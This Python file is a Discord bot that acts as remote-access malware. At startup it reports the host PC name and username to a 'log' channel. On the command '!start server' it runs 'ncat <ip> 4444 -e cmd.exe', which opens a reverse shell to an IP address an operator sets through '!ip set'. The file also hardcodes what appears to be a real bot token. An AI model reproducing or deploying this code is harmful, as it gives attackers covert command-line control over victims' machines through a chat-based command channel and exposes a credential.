import discord
from discord.ext import commands
import os
import socket
import subprocess
import threading
import asyncio
import paramiko


# Replace 'YOUR_BOT_TOKEN' with your actual Discord bot token
TOKEN = 'MTIxMzkzNDMxMDI4MTcwNzU5MQ.GSLJXU.2TqcDeLUtIbGGNfY2CfnHVDqhK8j9asp8t1JoE' 

current_ip = None

intents = discord.Intents.default()  
intents.members = True 
intents.message_content = True  # Enable the message content intent

bot = commands.Bot(command_prefix='!', intents=intents)  # Pass intents to the Bot constructor

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')

def get_pc_name():
    return os.environ["COMPUTERNAME"]

username = os.getlogin()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')


    # Find the logs channel
    for guild in bot.guilds:  # Iterate through all servers the bot is in
        logs_channel = discord.utils.find(lambda c: c.name == 'log', guild.text_channels)
        pc_name = get_pc_name()
        if logs_channel:
            await logs_channel.send(f'PC booted: {pc_name} owned by: {username}')
            break  # Stop searching once we've sent the message


async def start_connection(current_ip):
    command = "ncat " + current_ip + " 4444 -e cmd.exe"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    stdout, stderr = process.communicate()
    if process.returncode == 0:
        asyncio.run_coroutine_threadsafe(bot.get_channel(1213939499986587739).send(f"Session was successful"), bot.loop)
    else:
        asyncio.run_coroutine_threadsafe(bot.get_channel(1213939499986587739).send(f"Failed to execute command {command}. Error: {stderr.decode()}"), bot.loop)


@bot.event
async def on_message(message):
    if message.author == bot.user:  
        return

    print(f'[{message.channel}] {message.author}: {message.content}')

    # Check for replies to the bot
    if message.reference and message.reference.resolved == bot.user:  
        await message.channel.send("I heard you!")  

    if message.content.startswith("!start server"):
        global current_ip 
        if current_ip is not None: 
            await message.channel.send("Attempting to start server connection...")
            asyncio.create_task(start_connection(current_ip))  # Non-blocking call 
        else:
            await message.channel.send("IP address not set. Use the !ip set command")

    if message.content.startswith("!ip set"):
        words = message.content.split(" ")
        if len(words) < 3:
            await message.channel.send("Please provide an IP address after the command. Example: !ip set 192.168.1.208")
        else:
            new_ip = words[2]  # Get the IP from the message
            current_ip = new_ip
            await message.channel.send(f"IP set to {current_ip}")

bot.run(TOKEN) 
